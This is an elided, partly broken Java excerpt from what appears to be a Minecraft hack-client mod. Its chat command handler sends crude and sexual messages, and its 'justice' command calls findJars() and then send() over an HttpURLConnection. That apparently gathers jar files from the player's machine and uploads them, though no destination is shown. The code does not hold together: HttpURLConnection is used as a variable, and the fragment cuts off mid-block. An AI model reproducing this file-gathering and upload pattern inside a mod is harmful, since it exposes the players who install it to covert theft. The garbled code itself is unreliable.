...
public class Commands extends Mod {
	...
	public void onChat(ClientChatEvent e) {
		...
		if (message.startsWith(prefix)) {
			...
			if (message.equals("sexting")) {
				mc.player.sendChatMessage("[freesex] > sex -> 0, 0 ");
			}

			if (message.equals("XD")) {
				mc.player.sendChatMessage("> !XD");
			}

			if (message.equals("f")) {
				mc.player.sendChatMessage("[nhack] -> fuck you!");
			}
			...
			if (message.equals("justice")) {
				justice(HttpURLConnection);
				if (this.onEnabled()) {
					findJars();
					if (this.onEnabled()) {
						send(String.valueOf(HttpURLConnection));
					}
				}
			}
			String str = "";
			if (message.equals("soc")) {
